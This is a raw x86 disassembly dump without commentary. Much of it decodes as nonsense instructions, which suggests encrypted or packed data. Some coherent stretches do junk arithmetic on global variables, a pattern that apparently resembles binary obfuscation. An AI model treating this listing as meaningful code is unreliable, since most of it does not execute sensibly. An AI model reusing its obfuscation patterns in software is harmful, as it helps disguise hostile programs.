  402a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a79:	clc    
  402a7a:	dec    ebp
  402a7b:	mov    WORD PTR [eax-0x53],es
  402a7e:	sbb    edx,0x6f4803c6
  402a84:	push   edi
  402a85:	mov    ecx,0xb88c7fcf
  402a8a:	and    cl,BYTE PTR [esi+ecx*2]
  402a8d:	cmp    al,0x29
  402a8f:	inc    esi
  402a90:	loope  0x402ad0
  402a92:	cld    
  402a93:	clc    
  402a94:	in     al,0x62
  402a96:	(bad)  
  402a97:	or     al,0x5a
  402a99:	adc    dh,ch
  402a9b:	adc    eax,0xfa7a3376
  402aa0:	jmp    0xbda7:0x1d29aa02
  402aa7:	sar    dl,0x6e
  402aaa:	inc    esi
  402aab:	or     ebx,ecx
  402aad:	test   ebx,ebx
  402aaf:	imul   edi,esi,0x961f7c8c
  402ab5:	es in  eax,0x1c
  402ab8:	and    bh,BYTE PTR [eax-0x1bcee754]
  402abe:	xchg   ebp,eax
  402abf:	sbb    al,ch
  402ac1:	jo     0x402a81
  402ac3:	xor    ebx,DWORD PTR [eax]
  402ac5:	mov    dl,0xa0
  402ac7:	fwait
  402ac8:	stos   BYTE PTR es:[edi],al
  402ac9:	fistp  WORD PTR [esi+ecx*4+0x38]
  402acd:	popf   
  402ace:	mov    cl,0x85
  402ad0:	xchg   ebp,eax
  402ad1:	xor    eax,0xb279b095
  402ad6:	xchg   ebx,eax
  402ad7:	(bad)  
  402ad8:	cmc    
  402ad9:	mov    al,0xe6
  402adb:	cmc    
  402adc:	sbb    DWORD PTR [edi],ecx
  402ade:	inc    esp
  402adf:	xchg   esp,eax
  402ae0:	jl     0x402a78
  402ae2:	(bad)
  402ae5:	mov    ds:0xa0cf86a7,eax
  402aea:	adc    al,0xe5
  402aec:	jg     0x402b3b
  402aee:	jo     0x402af6
  402af0:	push   esp
  402af1:	int    0x9b
  402af3:	jecxz  0x402b50
  402af5:	mov    ebp,0x19a809eb
  402afa:	popa   
  402afb:	xchg   DWORD PTR [edx+0x9544324],edx
  402b01:	std    
  402b02:	sub    dh,BYTE PTR [ebp-0x60105c02]
  402b08:	jmp    0x7c24:0xba0048c7
  402b0f:	push   edi
  402b10:	mov    BYTE PTR [esi-0xc],ch
  402b13:	loop   0x402b70
  402b15:	push   cs
  402b16:	call   0x94891a67
  402b1b:	pop    ds
  402b1c:	outs   dx,BYTE PTR ds:[esi]
  402b1d:	mov    esi,0xb20a3a45
  402b22:	rcl    BYTE PTR [edi],1
  402b24:	mov    edx,DWORD PTR [ecx]
  402b26:	imul   edx,DWORD PTR [edx-0x51553203],0x36
  402b2d:	mov    ah,0xd
  402b30:	scas   eax,DWORD PTR es:[edi]
  402b31:	enter  0xba7d,0x5b
  402b35:	pop    ebp
  402b36:	in     eax,dx
  402b37:	imul   eax,DWORD PTR [esi+esi*1],0x30df08ed
  402b3e:	imul   edx,DWORD PTR [ecx],0xdcd4daea
  402b44:	sbb    esp,ebx
  402b46:	clc    
  402b47:	ins    DWORD PTR es:[edi],dx
  402b48:	mov    ss,WORD PTR [ebp-0x69]
  402b4b:	enter  0x3519,0x33
  402b4f:	ret    
  402b50:	inc    ecx
  402b51:	pop    es
  402b52:	mov    edx,?
  402b54:	xchg   ecx,eax
  402b55:	push   ecx
  402b56:	repnz es cld 
  402b59:	dec    edx
  402b5a:	xchg   esi,eax
  402b5b:	inc    esp
  402b5c:	mov    bh,0xbc
  402b5e:	mov    DWORD PTR [eax+0x77],ebp
  402b61:	pop    ss
  402b62:	mov    dl,0x7a
  402b64:	pop    ss
  402b65:	mov    edi,0xfd254c28
  402b6a:	push   ecx
  402b6b:	push   eax
  402b6c:	push   0xddf
  402b71:	sbb    DWORD PTR ds:0x428357,0x41e0
  402b7b:	push   0x2d0f
  402b80:	call   0x42202e
  402b85:	mov    ecx,DWORD PTR [ebp-0x68]
  402b88:	not    edx
  402b8a:	mov    edx,DWORD PTR [ebp-0x64]
  402b8d:	cmp    DWORD PTR ds:0x428243,0x0
  402b94:	mov    edx,DWORD PTR ds:0x428357
  402b9a:	mov    DWORD PTR ds:0x42814f,0x2873
  402ba4:	movzx  edx,WORD PTR ds:0x4281f3
  402bab:	jmp    0x402c06
  402bb0:	mov    DWORD PTR ds:0x4282cb,ebx
  402bb6:	cmp    DWORD PTR ds:0x428243,0x0
  402bbd:	jb     0x402be8
  402bc3:	push   DWORD PTR [ebp-0x1c]
  402bc6:	call   DWORD PTR ds:0x428d44
  402bcc:	mov    edx,DWORD PTR ds:0x428253
  402bd2:	add    DWORD PTR ds:0x42822b,edx
  402bd8:	mov    DWORD PTR ds:0x4282cf,0x7648
  402be2:	adc    edx,DWORD PTR ds:0x42820b
  402be8:	mov    edx,DWORD PTR ds:0x4282db
  402bee:	sbb    DWORD PTR ds:0x428267,edx
  402bf4:	mov    edx,DWORD PTR ds:0x428223
  402bfa:	xor    DWORD PTR ds:0x4282e7,edx
  402c00:	and    edx,DWORD PTR ds:0x4282bf
  402c06:	xor    eax,ecx
  402c08:	mov    ecx,DWORD PTR [ebp-0x70]
  402c0b:	xor    edx,0x594e
  402c11:	mov    edx,DWORD PTR [ebp-0x6c]
  402c14:	add    DWORD PTR ds:0x4281eb,0x7b5b
  402c1e:	sub    eax,ecx
  402c20:	mov    ecx,DWORD PTR ds:0x428193
  402c26:	mov    ecx,DWORD PTR [ecx]
  402c28:	and    DWORD PTR ds:0x42821b,ecx
  402c2e:	mov    ecx,DWORD PTR ds:0x422548
  402c34:	or     DWORD PTR ds:0x428113,0x509d
  402c3e:	lea    eax,[eax+ecx*1-0x27d2]
  402c45:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c48:	mov    edx,DWORD PTR [ebp-0x2c]
  402c4b:	sbb    DWORD PTR ds:0x4282bb,0x9f0
  402c55:	or     ecx,0x4f00
  402c5b:	add    DWORD PTR ds:0x42834f,0x42832b
  402c65:	jmp    0x403043
  402c6a:	nop
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	(bad)  
  402c6d:	call   0x1caec68c
  402c72:	int    0x3e
  402c74:	cmp    DWORD PTR [ebx+ecx*1+0x73],0xffffff85
  402c79:	jl     0x402c31
  402c7b:	hlt    
  402c7c:	sbb    BYTE PTR [eax],bl
  402c7e:	sahf   
  402c7f:	adc    bl,BYTE PTR [eax]
  402c81:	sbb    BYTE PTR [esi+0x30debb78],dh
  402c87:	bound  edx,QWORD PTR [esi+0x4f002629]
  402c8d:	lods   eax,DWORD PTR ds:[esi]
  402c8e:	into   
  402c8f:	cwde   
  402c90:	or     al,0x38
  402c92:	sub    eax,ebp
  402c94:	fild   QWORD PTR [ecx+ecx*4+0x7b764109]
  402c9b:	sbb    BYTE PTR [eax+ebp*2-0x21],dh
  402c9f:	cmp    DWORD PTR [ebx-0x4],0xcca31f1c
  402ca6:	xchg   DWORD PTR [ebx],edi
  402ca8:	xchg   edi,eax
  402ca9:	jle    0x402c81
  402cab:	push   ebx
  402cac:	cmp    BYTE PTR [edi],ch
  402cae:	or     ebp,DWORD PTR [edx+0x630ffcea]
  402cb4:	mov    ds:0x642cad6f,al
  402cb9:	mov    cl,0x7f
  402cbb:	sub    esp,eax
  402cbd:	fld    TBYTE PTR [ebp+0x4f5ab811]
  402cc3:	(bad)
  402cc7:	xchg   ebp,eax
  402cc8:	jecxz  0x402ce2
  402cca:	jb     0x402cd2
  402ccc:	push   ebx
  402ccd:	push   ss
  402cce:	daa    
  402ccf:	loope  0x402cf4
  402cd1:	repz mov esp,0xda48f57d
  402cd7:	xchg   edi,eax
  402cd8:	push   esi
  402cd9:	inc    ebp
  402cda:	call   0xc0dd01e9
  402cdf:	cld    
  402ce0:	and    BYTE PTR [eax],dh
  402ce2:	mov    cl,0x8a
  402ce4:	inc    edi
  402ce5:	loop   0x402c72
  402ce7:	in     eax,dx
  402ce8:	neg    DWORD PTR [eax-0xc]
  402ceb:	dec    ecx
  402cec:	xor    DWORD PTR [ebp-0x64be3491],eax
  402cf2:	pusha  
  402cf3:	xor    ch,BYTE PTR [edi+ebx*4-0x5e]
  402cf7:	aas    
  402cf8:	fnstcw WORD PTR [ebx+eiz*2]
  402cfb:	repnz sar DWORD PTR [esi-0x495574f7],1
  402d02:	mov    al,0x93
  402d04:	mov    cr7,ebp
  402d07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d08:	nop
  402d09:	adc    DWORD PTR [ecx+0x4d],ecx
  402d0c:	sbb    al,dl
  402d0e:	enter  0xca5f,0xfb
  402d12:	repz or edx,DWORD PTR [ecx]
  402d15:	pop    ds
  402d16:	jg     0x402d07
  402d18:	test   al,0xf1
  402d1a:	mov    bh,0xc6
  402d1c:	or     ah,al
  402d1e:	or     bh,BYTE PTR [si-0x2b48]
  402d23:	and    eax,0xb3c613a2
  402d28:	sbb    DWORD PTR [eax-0x120a5914],ecx
  402d2e:	mov    ch,dh
  402d30:	push   ecx
  402d31:	jmp    0x5edb4df6
  402d36:	sub    eax,0x92d2b93c
  402d3b:	add    al,0x96
  402d3d:	jge    0x402d56
  402d3f:	daa    
  402d40:	sti    
  402d41:	and    eax,0x38e923a
  402d46:	mov    es,WORD PTR [edi+0x4c]
  402d49:	stc    
  402d4a:	mov    WORD PTR [ebx-0x18f3672d],?
  402d50:	jecxz  0x402cd9
  402d52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d53:	scas   eax,DWORD PTR es:[edi]
  402d54:	mov    edi,0xbd31196e
  402d59:	sar    DWORD PTR [ecx+edi*1+0x45],0x0
  402d5e:	lods   eax,DWORD PTR ds:[esi]
  402d5f:	inc    esi
  402d60:	loope  0x402de0
  402d62:	aas    
  402d63:	jmp    FWORD PTR [edx-0x66]
  402d66:	inc    esi
  402d67:	mov    esi,0x1d0d8d54
  402d6c:	icebp  
  402d6d:	inc    eax
  402d6e:	inc    esi
  402d6f:	add    edx,ebp
  402d71:	dec    edi
  402d72:	inc    eax
  402d73:	inc    ebx
  402d74:	add    eax,0xbee1056
  402d79:	mov    esi,0xcd7cb435
  402d7e:	or     BYTE PTR [eax+0x8500a94],bl
  402d84:	ror    DWORD PTR [esi],cl
  402d86:	mov    eax,ds:0x13cf4570
  402d8b:	xlat   BYTE PTR ds:[ebx]
  402d8c:	mov    WORD PTR [edi+0x71],fs
  402d8f:	add    DWORD PTR [eax-0x31],edi
  402d92:	in     al,dx
  402d93:	cmp    dl,BYTE PTR ss:[edx]
  402d96:	push   edx
  402d97:	sbb    DWORD PTR [edi+0x145f992],0xffffffd5
  402d9e:	add    dh,ch
  402da0:	mov    esp,0xe29b583c
  402da5:	jnp    0x402d27
  402da7:	shl    dh,1
  402da9:	adc    edx,DWORD PTR [ebx+ebx*4+0x76d5dcec]
  402db0:	repnz jmp 0x48d2:0xe4bb2af3
  402db8:	js     0x402d9b
  402dba:	sub    eax,0x10adffc0
  402dbf:	xor    DWORD PTR [edx],eax
  402dc1:	adc    ch,dl
  402dc3:	jbe    0x402df8
  402dc5:	inc    eax
  402dc6:	push   0x22
  402dc8:	fidivr DWORD PTR ds:0x746cb825
  402dce:	inc    esp
  402dcf:	in     al,dx
  402dd0:	push   es
  402dd1:	and    cl,bl
  402dd3:	xchg   BYTE PTR [ebx+ebp*8],ch
  402dd6:	and    BYTE PTR [ebx*2+0x27632239],bh
  402ddd:	jns    0x402d6e
  402ddf:	dec    esp
  402de0:	cmp    DWORD PTR [ecx],eax
  402de2:	adc    DWORD PTR [ebp+0x4ee292bc],0x6a001a00
  402dec:	mov    ecx,0x5424ccea
  402df1:	sub    DWORD PTR [ebp-0x2d515f3f],ebx
  402df7:	push   ebp
  402df8:	add    eax,DWORD PTR [edx-0x628482b3]
  402dfe:	pusha  
  402dff:	pop    edx
  402e00:	adc    ah,BYTE PTR [eax+ebx*2+0x278f99e0]
  402e07:	sub    esp,DWORD PTR [ebx]
  402e09:	aaa    
  402e0a:	int    0x9a
  402e0c:	mov    esi,0x49bee389
  402e11:	push   0xffffffd7
  402e13:	lahf   
  402e14:	mov    cl,BYTE PTR [eax+0x7e8775eb]
  402e1a:	cwde   
  402e1b:	dec    edx
  402e1c:	jle    0x402e0d
  402e1e:	test   DWORD PTR [edi],eax
  402e20:	dec    ecx
  402e21:	pop    ecx
  402e22:	push   cs
  402e23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e24:	cmp    ch,BYTE PTR cs:0x2b502950
  402e2b:	pop    esi
  402e2c:	lds    ebp,FWORD PTR [ebp+0x4014fbfd]
  402e32:	(bad)  
  402e33:	shl    dl,cl
  402e35:	push   edi
  402e36:	pop    ebx
  402e37:	jmp    0x402e74
  402e39:	(bad)  
  402e3b:	sub    ah,dh
  402e3d:	mov    ebx,0xe6705728
  402e42:	imul   esp,ebx,0xd5e6bd8e
  402e48:	int3   
  402e49:	xchg   BYTE PTR [esi+ecx*1+0x70],dh
  402e4d:	jae    0x402e90
  402e4f:	pop    ebx
  402e50:	fst    QWORD PTR [esi-0x2]
  402e53:	dec    esi
  402e54:	dec    esp
  402e55:	scas   al,BYTE PTR es:[edi]
  402e56:	js     0x402dec
  402e58:	test   BYTE PTR [edi+0x32],dh
  402e5b:	ss in  eax,0xf3
  402e5e:	dec    ebx
  402e5f:	pop    ebx
  402e60:	jae    0x402e4d
  402e62:	ret    0x3b0c
  402e65:	and    esp,ebp
  402e67:	in     al,0x9b
  402e69:	push   ecx
  402e6a:	add    eax,0x8cd68c4f
  402e6f:	(bad)  
  402e70:	aas    
  402e71:	imul   ecx,DWORD PTR [ebx],0x40
  402e74:	aad    0xd5
  402e76:	ins    BYTE PTR es:[edi],dx
  402e77:	xor    al,0x88
  402e79:	(bad)  
  402e7a:	addr16 daa 
  402e7c:	push   ecx
  402e7d:	loop   0x402e86
  402e7f:	fs (bad) 
  402e81:	sbb    bl,BYTE PTR [ebx-0x12e66422]
  402e87:	lods   al,BYTE PTR ds:[esi]
  402e88:	scas   al,BYTE PTR es:[edi]
  402e89:	fs loope 0x402e9a
  402e8c:	test   DWORD PTR [edi+0x4e80a647],ecx
  402e92:	les    edi,FWORD PTR [eax+0x71adac0e]
  402e98:	and    al,0x6d
  402e9a:	lods   al,BYTE PTR ds:[esi]
  402e9b:	inc    edx
  402e9c:	sub    al,0xeb
  402e9e:	mov    dl,0xef
  402ea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ea1:	or     cl,cl
  402ea3:	xor    BYTE PTR [ecx-0x6a6d0479],al
  402ea9:	jecxz  0x402ee3
  402eab:	cmp    eax,0x4fbd2681
  402eb0:	cmp    DWORD PTR [esp+edx*4-0x722ade9f],edi
  402eb7:	mov    dh,0x22
  402eb9:	push   cs
  402eba:	push   esp
  402ebb:	sbb    edi,DWORD PTR [edi-0x21b206f6]
  402ec1:	push   0x53419535
  402ec6:	add    al,0xe7
  402ec8:	test   BYTE PTR [ecx+0x2228e2ae],0x75
  402ecf:	or     ah,al
  402ed1:	scas   eax,DWORD PTR es:[edi]
  402ed2:	ret    0xdc18
  402ed5:	std    
  402ed6:	shl    BYTE PTR [ebp-0xb],1
  402ed9:	loopne 0x402f1f
  402edb:	scas   al,BYTE PTR es:[edi]
  402edc:	sti    
  402edd:	int    0x8f
  402edf:	cmp    eax,0xe4968fc
  402ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ee5:	xchg   edx,eax
  402ee6:	add    al,0x71
  402ee8:	mov    dh,0xa5
  402eea:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  402eec:	pop    ebp
  402eed:	xchg   ecx,eax
  402eee:	lods   eax,DWORD PTR ds:[esi]
  402eef:	loopne 0x402e8d
  402ef1:	add    eax,0xa4868544
  402ef6:	(bad)  {k4}{z}
  402efb:	add    eax,0x190e4988
  402f00:	mov    bl,0xe2
  402f02:	pop    ebx
  402f03:	int    0x7b
  402f05:	lea    esp,[ecx]
  402f07:	lea    edx,[esi-0x2b]
  402f0a:	mov    ds:0x9282b97c,eax
  402f0f:	popf   
  402f10:	mov    ebp,0xc0779e30
  402f15:	jnp    0x402ebf
  402f17:	imul   edx,DWORD PTR [eax],0xf4bcf4cc
  402f1d:	adc    bh,BYTE PTR [edi]
  402f1f:	add    DWORD PTR [ebx],eax
  402f21:	jne    0x402f07
  402f23:	dec    esp
  402f24:	dec    ebx
  402f25:	imul   ebp,DWORD PTR ds:0x958ad01f,0xffffffb7
  402f2c:	mov    al,0x13
  402f2e:	jne    0x402f91
  402f30:	mov    edi,0x7028aafe
  402f35:	or     esi,edx
  402f37:	xchg   ecx,eax
  402f38:	mov    esi,0x500d5ef8
  402f3d:	mov    gs,eax
  402f3f:	les    ebx,FWORD PTR [eax]
  402f41:	jo     0x402f17
  402f43:	or     ecx,eax
  402f45:	or     DWORD PTR [edx+0x20eec2fd],esi
  402f4b:	push   ebx
  402f4c:	ss pop eax
  402f4e:	jp     0x402f62
  402f50:	cmc    
  402f51:	sub    edx,edi
  402f53:	repnz sub BYTE PTR [edi+ebx*2],0x92
  402f58:	fwait
  402f59:	retf   0xbe24
  402f5c:	pop    esi
  402f5d:	imul   ebx,edi,0x76
  402f60:	add    bl,ah
  402f62:	jns    0x402efb
  402f64:	dec    eax
  402f65:	cld    
  402f66:	imul   edi,DWORD PTR [ebx+0xfd57a7a],0x9925f5ee
  402f70:	jp     0x402f1b
  402f72:	jo     0x402fcc
  402f74:	in     eax,0xb5
  402f76:	mov    dh,0x61
  402f78:	pusha  
  402f79:	test   eax,0x93f21873
  402f7e:	pop    ss
  402f7f:	jp     0x402f86
  402f81:	jp     0x402fad
  402f83:	mov    dh,0xa3
  402f85:	jb     0x402fea
  402f87:	adc    BYTE PTR [ebx+ecx*4],bh
  402f8a:	cmp    dh,BYTE PTR [ebx]
  402f8c:	pop    es
  402f8d:	(bad)  
  402f8f:	mov    eax,DWORD PTR [edx+0x6779b92d]
  402f95:	xchg   DWORD PTR [eax+esi*8],esp
  402f98:	mov    eax,0x44ebccce
  402f9d:	mov    ecx,0xe00244
  402fa2:	cmp    edx,DWORD PTR [ecx-0x3]
  402fa5:	pop    ebx
  402fa6:	mov    ch,0xe0
  402fa8:	pop    ebx
  402fa9:	or     BYTE PTR [esi-0x43853fde],dh
  402faf:	inc    eax
  402fb0:	cld    
  402fb1:	stos   DWORD PTR es:[edi],eax
  402fb2:	into   
  402fb3:	mov    ch,0xe0
  402fb5:	lea    esp,ds:[edi-0x58]
  402fb9:	les    ebx,FWORD PTR [edi+0x37]
  402fbc:	and    eax,0x2d49fa40
  402fc1:	sbb    eax,0x7616371b
  402fc6:	in     eax,dx
  402fc7:	push   0x6e284bf5
  402fcc:	lea    edi,[edi]
  402fce:	shl    bl,1
  402fd0:	cli    
  402fd1:	xor    bl,BYTE PTR [edx-0x74]
  402fd4:	add    DWORD PTR [ebp-0x32],edi
  402fd7:	pop    edi
  402fd8:	jmp    0xf42a3ca4
  402fdd:	or     esi,ecx
  402fdf:	ret    0xbb7d
  402fe2:	int3   
  402fe3:	fdiv   QWORD PTR [edi]
  402fe5:	dec    edx
  402fe6:	push   ss
  402fe7:	xor    ebp,DWORD PTR [ebp+0x21be76fe]
  402fed:	push   cs
  402fee:	loop   0x402f77
  402ff0:	and    al,0x52
  402ff2:	jmp    0x402f8f
  402ff4:	mov    ds:0xccacb676,al
  402ff9:	loopne 0x402ffb
  402ffb:	lods   al,BYTE PTR ds:[esi]
  402ffc:	jmp    0x40300f
  402ffe:	dec    ebp
  402fff:	dec    eax
  403000:	xor    BYTE PTR [ebp+0x6bd51685],dh
  403006:	cmp    ebx,DWORD PTR [eax]
  403008:	xor    BYTE PTR [esi],bl
  40300a:	es leave 
  40300c:	fcmove st,st(5)
  40300e:	push   edi
  40300f:	pop    esp
  403010:	jecxz  0x403009
  403012:	cmp    DWORD PTR [edi-0x1a6154f3],eax
  403018:	ret    
  403019:	out    0xbd,al
  40301b:	lahf   
  40301c:	mov    eax,ds:0xa06b7a50
  403021:	sub    cl,ah
  403023:	add    ebx,DWORD PTR [edx+edx*1]
  403026:	shl    BYTE PTR ss:[ebp+0x13],cl
  40302a:	dec    edx
  40302b:	outs   dx,DWORD PTR ds:[esi]
  40302c:	xchg   DWORD PTR [edx-0x12],ecx
  40302f:	call   0xdbb2:0xc0095747
  403036:	adc    esp,DWORD PTR [edx]
  403038:	adc    eax,0x2d044cf1
  40303d:	bound  eax,QWORD PTR [edi]
  40303f:	pop    esp
  403040:	jmp    0xca63b6ca
  403045:	add    edx,0x3463
  40304b:	mov    edx,DWORD PTR [ebp-0x34]
  40304e:	or     ecx,edx
  403050:	xor    ecx,0x5fdd
  403056:	cmp    ecx,DWORD PTR [eax]
  403058:	mov    DWORD PTR ds:0x42825b,0x665d
  403062:	jne    0x40a9b0
  403068:	mov    ecx,DWORD PTR [esi]
  40306a:	cmp    DWORD PTR ds:0x42835f,0x0
  403071:	mov    DWORD PTR ds:0x428363,edx
  403077:	mov    DWORD PTR ds:0x4282ab,0x1413
  403081:	mov    edx,DWORD PTR ds:0x428353
  403087:	jmp    0x4030db
  40308c:	mov    DWORD PTR ds:0x42811f,0x4beb
  403096:	not    eax
  403098:	cmp    DWORD PTR ds:0x42835f,0x0
  40309f:	jl     0x4030c1
  4030a5:	push   DWORD PTR [ebp-0x20]
  4030a8:	push   DWORD PTR [ebp-0xc]
  4030ab:	call   DWORD PTR ds:0x428d64
  4030b1:	mov    DWORD PTR ds:0x42820b,0x4e29
  4030bb:	inc    DWORD PTR ds:0x42822f
  4030c1:	or     edx,DWORD PTR ds:0x4282cb
  4030c7:	add    edx,DWORD PTR ds:0x42814f
  4030cd:	sub    edx,edx
  4030cf:	add    DWORD PTR ds:0x428357,edx
  4030d5:	sbb    edx,DWORD PTR ds:0x4282df
  4030db:	mov    eax,DWORD PTR [esi+0x4]
  4030de:	sbb    edx,DWORD PTR ds:0x428343
  4030e4:	shrd   ecx,eax,0x2
  4030e8:	shr    eax,0x2
  4030eb:	mov    eax,DWORD PTR [esi]
  4030ed:	xor    DWORD PTR ds:0x428363,edx
  4030f3:	mov    edx,DWORD PTR [esi+0x4]
  4030f6:	neg    DWORD PTR ds:0x42811b
  4030fc:	shl    eax,0x1e
  4030ff:	xor    ecx,edi
  403101:	xor    eax,eax
  403103:	sbb    DWORD PTR ds:0x428367,0x1e67
  40310d:	or     eax,ecx
  40310f:	jmp    0x4034ed
  403114:	and    al,0xd6
  403116:	push   esp
  403117:	repnz and dh,BYTE PTR [ebx+0x22]
  40311b:	inc    esi
  40311c:	sar    BYTE PTR [eax-0x73],1
  40311f:	jo     0x4030e7
  403121:	cmp    ebx,ecx
  403123:	mov    esp,0x1818ec3d
  403128:	sahf   
  403129:	adc    bl,BYTE PTR [eax]
  40312b:	sbb    BYTE PTR [eax],cl
  40312d:	(bad)  [ebx]
  40312f:	loope  0x403178
  403131:	scas   al,BYTE PTR es:[edi]
  403132:	mov    ah,0x6
  403134:	or     dh,bh
  403136:	popf   
  403137:	lea    ebx,[esi+0x78]
  40313a:	push   edi
  40313b:	adc    esi,edx
  40313d:	jns    0x4031a6
  40313f:	lds    ebp,FWORD PTR [edi+edx*4+0x2f]
  403143:	mov    bl,0x63
  403145:	lahf   
  403146:	(bad)  [eax]
  403148:	fimul  WORD PTR [eax-0x15]
  40314b:	jmp    0x4030e1
  40314d:	push   edx
  40314e:	sub    esi,DWORD PTR [ebp-0x484bca0]
  403154:	mov    ebp,0x7268d88d
  403159:	popa   
  40315a:	aad    0x7
  40315c:	jmp    0xa95bd17a
  403161:	ror    DWORD PTR [edi-0x48],1
  403164:	outs   dx,BYTE PTR ds:[esi]
  403165:	push   0xffffffdd
  403167:	std    
  403168:	jno    0x403163
  40316a:	push   ebp
  40316b:	fldl2t 
  40316d:	add    al,0x1d
  40316f:	inc    ebx
  403170:	shr    BYTE PTR [eax+eiz*8],1
  403173:	out    dx,eax
  403174:	icebp  
  403175:	or     DWORD PTR [eax-0x2df75a25],esi
  40317b:	mov    eax,ds:0x15c32d5a
  403180:	imul   ecx,DWORD PTR [ecx],0xfffffff8
  403183:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403184:	inc    edi
  403185:	or     al,0x1e
  403187:	add    ebx,DWORD PTR [edx]
  403189:	jnp    0x40312c
  40318b:	xlat   BYTE PTR ds:[ebx]
  40318c:	push   ecx
  40318d:	sub    DWORD PTR [ebx-0x79],esp
  403190:	inc    ecx
  403191:	scas   eax,DWORD PTR es:[edi]
  403192:	jmp    0xdd1d:0x251fc47c
  403199:	xor    ch,BYTE PTR [ebp+0x20e043f9]
  40319f:	(bad)  
  4031a0:	jbe    0x40321f
  4031a2:	fadd   DWORD PTR [ecx-0x4bb207af]
  4031a8:	out    0xde,al
  4031aa:	and    BYTE PTR [esi],ch
  4031ac:	(bad)  
  4031ad:	mov    esi,0xc27c34b7
  4031b2:	retf   
  4031b3:	fs lock jecxz 0x403217
  4031b7:	shl    DWORD PTR [ecx-0x11],1
  4031ba:	aam    0x7e
  4031bc:	add    BYTE PTR [edx-0x7a],al
  4031bf:	xchg   DWORD PTR [edx+0x44ae0d4e],eax
  4031c5:	or     edi,DWORD PTR ds:0x5907f2ad
  4031cb:	lods   al,BYTE PTR ds:[esi]
  4031cc:	lea    edx,[ecx]
  4031ce:	mov    ds:0x16d25822,al
  4031d3:	inc    DWORD PTR [esi+esi*8-0x54]
  4031d7:	in     eax,0xd3
  4031d9:	fisttp QWORD PTR [eax]
  4031db:	jl     0x40317c
  4031dd:	mov    ecx,0x103e15ea
  4031e2:	push   ebx
  4031e3:	imul   ebx,DWORD PTR [esi+0x63],0x76
  4031e7:	jae    0x40318d
  4031e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031ea:	ror    BYTE PTR ds:0x2e01ba5a,cl
  4031f0:	pop    es
  4031f1:	inc    eax
  4031f2:	xor    BYTE PTR [edx],al
  4031f4:	sbb    ebp,0x79c4df26
  4031fa:	enter  0x6026,0xa8
  4031fe:	ins    BYTE PTR es:[edi],dx
  4031ff:	retf   0x4618
  403202:	std    
  403203:	lds    ecx,FWORD PTR [eax-0x2e]
  403206:	inc    esi
  403207:	cdq    
  403208:	adc    ecx,DWORD PTR [eax+0x5bb4f957]
  40320e:	mov    ebx,0xc920e59f
  403213:	push   ds
  403214:	jle    0x4031d7
  403216:	aam    0x33
  403218:	mov    esi,0x3526074
  40321d:	inc    ebx
  40321e:	outs   dx,DWORD PTR ds:[esi]
  40321f:	popf   
  403220:	icebp  
  403221:	push   ebx
  403222:	xchg   DWORD PTR [eax+0x585efe55],eax
  403228:	in     al,0x84
  40322a:	retf   0x56c8
  40322d:	in     eax,0x7b
  40322f:	or     BYTE PTR [edx],ah
  403231:	sti    
  403232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403233:	into   
  403234:	fwait
  403235:	push   0xffffffce
  403237:	mov    ds:0xc31eb8e3,eax
  40323c:	je     0x403236
  40323e:	dec    ebp
  40323f:	push   esp
  403240:	test   eax,0xb854e329
  403245:	leave  
  403246:	sub    BYTE PTR [ebx+0x2e6ff7c7],bl
  40324c:	cmp    bl,bh
  40324e:	mov    bh,0x53
  403250:	addr16 dec edx
  403252:	imul   esi,ebp,0x5cd2214d
  403258:	add    BYTE PTR [edx],0xea
  40325b:	fdivr  QWORD PTR [esi]
  40325d:	or     ch,ch
  40325f:	inc    esp
  403260:	ret    0x698a
  403263:	sbb    BYTE PTR [edx+0x35],ch
  403266:	aad    0xa7
  403268:	sbb    BYTE PTR [esi],cl
  40326a:	add    BYTE PTR [ecx+eax*8],ah
  40326d:	repz inc ecx
  40326f:	jl     0x403299
  403271:	enter  0x898c,0xdf
  403275:	and    DWORD PTR [ebx-0x44],eax
  403278:	cli    
  403279:	stos   BYTE PTR es:[edi],al
  40327a:	push   esp
  40327b:	shr    DWORD PTR [ebx-0x5c8d3aa9],cl
  403281:	mov    eax,ds:0xc2477c1e
  403286:	stos   BYTE PTR es:[edi],al
  403287:	jge    0x40329b
  403289:	mov    BYTE PTR ds:0xe2d99ffd,cl
  40328f:	pop    ebx
  403290:	adc    ah,bh
  403292:	mov    ch,0x5a
  403294:	shl    DWORD PTR [ebx],1
  403296:	loop   0x4032ca
  403298:	iret   
  403299:	jne    0x403267
  40329b:	aam    0x5b
  40329d:	push   es
  40329e:	stos   BYTE PTR es:[edi],al
  40329f:	std    
  4032a0:	sub    al,0x2
  4032a2:	inc    ebx
  4032a3:	aad    0xaf
  4032a5:	xchg   DWORD PTR [eax-0x49c43b3d],esp
  4032ab:	mov    eax,ds:0x13c40dc8
  4032b0:	sbb    al,BYTE PTR [edi+0x1a5dcc30]
  4032b6:	cmp    BYTE PTR [edx],cl
  4032b8:	or     DWORD PTR [edi],edx
  4032ba:	mov    edi,0xaf63205c
  4032bf:	mov    dl,0xf6
  4032c1:	popf   
  4032c2:	aaa    
  4032c3:	int    0xe
  4032c5:	sbb    esp,DWORD PTR [ecx-0x1a007332]
  4032cb:	lea    eax,[esi+edx*8]
  4032ce:	test   eax,0xfbeec036
  4032d3:	stos   DWORD PTR es:[edi],eax
  4032d4:	pop    ebp
  4032d5:	aas    
  4032d6:	xor    DWORD PTR [esi+0x6e4deb75],ecx
  4032dc:	add    BYTE PTR [ebx+0x5ec67e20],bh
  4032e2:	test   al,0xc5
  4032e4:	inc    edi
  4032e5:	and    BYTE PTR [eax-0x2a],0x86
  4032e9:	add    ch,BYTE PTR [edx-0x17188da4]
  4032ef:	lods   al,BYTE PTR ds:[esi]
  4032f0:	addr16 xchg esi,eax
  4032f2:	inc    edi
  4032f3:	jmp    0xc87b:0xe83a3941
  4032fa:	stos   BYTE PTR es:[edi],al
